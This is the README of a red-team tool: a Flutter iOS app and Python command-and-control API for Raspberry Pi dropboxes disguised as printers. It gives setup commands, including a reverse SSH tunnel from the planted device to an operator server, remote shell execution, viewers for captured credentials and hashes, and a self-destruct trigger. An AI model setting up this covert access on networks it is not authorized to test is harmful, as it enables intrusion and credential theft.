# Phantom Dashboard

<p align="center">
  <img src="docs/images/phantom-dashboard-banner.png" alt="Phantom Dashboard" width="600">
</p>

<p align="center">
  <strong>Mobile Command & Control for Phantom Printer V2</strong>
</p>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#screenshots">Screenshots</a> •
  <a href="#installation">Installation</a> •
  <a href="#c2-api-setup">C2 API Setup</a> •
  <a href="#configuration">Configuration</a> •
  <a href="#architecture">Architecture</a>
</p>

---

## 🔗 Part of the Phantom Printer Ecosystem

This mobile app is a companion to the **[Phantom Printer V2](https://github.com/un1xr00t/red-teaming-dropbox-v2)** red teaming dropbox. The main repository contains:

- Raspberry Pi 5 dropbox setup (Kali Linux)
- HP LaserJet printer emulation modules
- Multi-channel C2 infrastructure
- Network reconnaissance tools
- n8n automation workflows

**This repository focuses solely on the mobile dashboard and its C2 API server.**

---

## Overview

Phantom Dashboard is a Flutter iOS application that provides real-time command and control capabilities for Phantom Printer dropboxes deployed in the field. Connect to your dropboxes via a secure C2 API running on your Linode VPS, monitor their status, execute commands, and view captured loot—all from your phone.

### How It Works

```
┌─────────────────┐     SSH Tunnel      ┌─────────────────┐
│  Raspberry Pi   │◄──────────────────►│   Linode VPS    │
│  (Dropbox)      │     Port 2222       │   (C2 Server)   │
│  Target Network │                     │   Port 8443     │
└─────────────────┘                     └────────┬────────┘
                                                 │
                                                 │ HTTPS API
                                                 │
                                        ┌────────▼────────┐
                                        │  Flutter App    │
                                        │  (Your Phone)   │
                                        └─────────────────┘
```

---

## Features

### 📊 Dashboard
- Real-time dropbox status (online/offline)
- System metrics (uptime, load, connection health)
- Aggregated loot statistics (hosts, credentials, hashes)
- Recent alerts feed

### 🖥️ Command Center
- Execute shell commands on dropboxes
- Quick command buttons for common operations
- Full command history with output
- Real-time execution feedback

### 🔐 Loot Browser
- View discovered hosts from network scans
- Browse captured credentials
- Inspect captured hashes
- Copy data to clipboard

### ⚙️ Settings
- Secure C2 API configuration
- Connection testing
- Self-destruct trigger (with confirmation)

### 🎨 Design
- Dark tactical theme with cyan accents
- Glassmorphism UI elements
- Smooth animations throughout
- Haptic feedback for actions

---

## Screenshots

<p align="center">

<img width="200" src="https://github.com/user-attachments/assets/9a8b0a3e-29fc-4e46-b9d0-b8e738525301" />
<img width="200" src="https://github.com/user-attachments/assets/46a205fd-ea11-431b-a87b-504585fb9285" />
<img width="200" src="https://github.com/user-attachments/assets/d8e9a9e0-efda-459b-bd7e-a118ed9a324a" />
<img width="200" src="https://github.com/user-attachments/assets/f294f6a4-5a69-45a4-8d5c-db9d4fb765b6" />

</p>

---

## Installation

### Prerequisites

- macOS with Xcode installed
- Flutter SDK 3.2.0 or higher
- iOS device or simulator (iOS 14.0+)
- A deployed Phantom Printer dropbox
- Linode VPS (or similar) for the C2 API

### Quick Start

```bash
# Clone the repository
git clone https://github.com/un1xr00t/phantom-dashboard.git
cd phantom-dashboard

# Get dependencies
flutter pub get

# Install iOS pods
cd ios && pod install && cd ..

# Run on your device
flutter run
```

### Building for Release

```bash
# Build iOS release
flutter build ios --release

# Open in Xcode for signing and deployment
open ios/Runner.xcworkspace
```

---

## C2 API Setup

The C2 API server runs on your Linode VPS and bridges the Flutter app to your dropboxes via SSH tunnel.

### 1. Server Requirements

- Ubuntu 22.04+ or Debian 11+
- Python 3.10+
- Open ports: 8443 (API), 2222 (SSH tunnel)

### 2. Installation

```bash
# SSH into your Linode
ssh root@YOUR_LINODE_IP

# Create directory
mkdir -p /opt/phantom-c2
cd /opt/phantom-c2

# Copy c2_api.py from this repo's server/ directory
# Or download it:
wget https://raw.githubusercontent.com/un1xr00t/phantom-dashboard/main/server/c2_api.py

# Install dependencies
apt update && apt install -y python3 python3-pip python3-venv netcat-openbsd rsync
python3 -m venv venv
source venv/bin/activate
pip install fastapi uvicorn pydantic

# Generate SSL certificates
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem \
  -days 365 -nodes -subj "/CN=phantom-c2"

# Generate API key
API_KEY=$(openssl rand -hex 32)
echo "PHANTOM_API_KEY=${API_KEY}" > .env
echo "SSH_TUNNEL_PORT=2222" >> .env
echo "DROPBOX_USER=kali" >> .env

# Display your API key (save this!)
echo "Your API Key: ${API_KEY}"
```

### 3. SSH Key Setup

The C2 API authenticates to dropboxes via SSH key:

```bash
# Generate key pair (on Linode)
ssh-keygen -t ed25519 -f /root/.ssh/id_dropbox -N ""

# Copy public key to your dropbox (Pi)
ssh-copy-id -i /root/.ssh/id_dropbox.pub kali@YOUR_PI_IP
```

### 4. Systemd Service

Create `/etc/systemd/system/phantom-c2.service`:

```ini
[Unit]
Description=Phantom Printer C2 API
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/phantom-c2
EnvironmentFile=/opt/phantom-c2/.env
ExecStart=/opt/phantom-c2/venv/bin/python /opt/phantom-c2/c2_api.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Enable and start:

```bash
systemctl daemon-reload
systemctl enable phantom-c2
systemctl start phantom-c2

# Open firewall
ufw allow 8443/tcp
```

### 5. Verify Setup

```bash
curl -sk -H "X-API-Key: YOUR_API_KEY" https://localhost:8443/api/health
```

Expected response:
```json
{"status":"ok","tunnel_active":true,"dropboxes_registered":1}
```

---

## Configuration

### App Settings

On first launch, go to **Settings → C2 Configuration**:

| Field | Description | Example |
|-------|-------------|---------|
| C2 Server Host | Your Linode IP or domain | `172.234.25.201` |
| API Key | Generated during setup | `fe9b6591...` |

Tap **Test Connection** to verify.

### Dropbox Connection

Your Raspberry Pi dropbox connects to the C2 server via reverse SSH tunnel. This should already be configured if you followed the [main Phantom Printer setup](https://github.com/un1xr00t/red-teaming-dropbox-v2).

The tunnel command on your Pi:
```bash
ssh -R 2222:localhost:22 -i /path/to/key root@YOUR_LINODE_IP -N -f
```

---

## Architecture

### Flutter App Structure

```
lib/
├── main.dart                    # App entry point
├── core/
│   ├── theme/app_theme.dart     # Dark cyber theme
│   ├── router/app_router.dart   # Navigation
│   ├── services/
│   │   ├── api_service.dart     # C2 API client
│   │   └── storage_service.dart # Secure storage
│   └── models/
│       ├── dropbox_model.dart   # Dropbox data
│       ├── command_model.dart   # Command/result data
│       ├── loot_model.dart      # Credentials, hashes, hosts
│       └── alert_model.dart     # Alert data
└── features/
    ├── dashboard/               # Main dashboard screen
    ├── commands/                # Command center
    ├── loot/                    # Loot browser
    ├── alerts/                  # Alert feed
    └── settings/                # Configuration
```

### C2 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/health` | GET | Health check |
| `/api/dropboxes` | GET | List all dropboxes |
| `/api/dropboxes/{id}` | GET | Get dropbox details |
| `/api/dropboxes/{id}/command` | POST | Execute command |
| `/api/dropboxes/{id}/commands` | GET | Command history |
| `/api/dropboxes/{id}/loot/summary` | GET | Loot statistics |
| `/api/dropboxes/{id}/loot/credentials` | GET | Captured credentials |
| `/api/dropboxes/{id}/loot/hashes` | GET | Captured hashes |
| `/api/dropboxes/{id}/loot/hosts` | GET | Discovered hosts |
| `/api/dropboxes/{id}/heartbeat` | POST | Receive heartbeat |
| `/api/dropboxes/{id}/self-destruct` | POST | Trigger self-destruct |

---

## Integration with n8n

The Phantom Printer ecosystem uses n8n for automation and Discord notifications. While this app communicates directly with the C2 API, the n8n workflows continue to handle:

- Heartbeat notifications to Discord
- Alert forwarding
- Loot processing automation

See the [main repository](https://github.com/un1xr00t/red-teaming-dropbox-v2) for n8n workflow setup.

---

## Security Considerations

⚠️ **This tool is designed for authorized penetration testing and red team operations only.**

- API keys are stored in iOS Keychain via `flutter_secure_storage`
- All C2 communication uses HTTPS (self-signed cert by default)
- SSH tunnel provides encrypted channel to dropboxes
- No sensitive data is logged

For production deployments:
- Use Let's Encrypt certificates instead of self-signed
- Implement IP whitelisting on the C2 API
- Rotate API keys regularly
- Enable VPN for additional security layer

---

## Troubleshooting

### App can't connect to C2 API

1. Verify Linode firewall allows port 8443
2. Check API key is correct
3. Ensure C2 service is running: `systemctl status phantom-c2`

### Dropbox shows "Offline"

1. Check SSH tunnel from Pi: `ssh -R 2222:localhost:22 ...`
2. Verify tunnel on Linode: `nc -z localhost 2222`
3. Check Pi's network connectivity

### Commands fail with "Dropbox not connected"

1. Re-establish SSH tunnel from Pi
2. Restart C2 API: `systemctl restart phantom-c2`

### Stats show all zeros

1. Verify loot directory exists on Pi: `/home/kali/dropbox-v2/loot/`
2. Check file: `/home/kali/dropbox-v2/loot/scans/live-hosts.txt`
3. Run a network scan to populate data

---

## Contributing

Contributions are welcome! Please read the [main project's contribution guidelines](https://github.com/un1xr00t/red-teaming-dropbox-v2/blob/main/CONTRIBUTING.md).

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## Disclaimer

This software is provided for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper authorization before deploying this tool. The authors are not responsible for any misuse or damage caused by this software.

---

## Author

**un1xr00t**

- GitHub: [@un1xr00t](https://github.com/un1xr00t)
- Main Project: [Phantom Printer V2](https://github.com/un1xr00t/red-teaming-dropbox-v2)

---

<p align="center">
  <strong>Part of the Phantom Printer V2 Ecosystem</strong><br>
  <a href="https://github.com/un1xr00t/red-teaming-dropbox-v2">View Main Repository →</a>
</p>
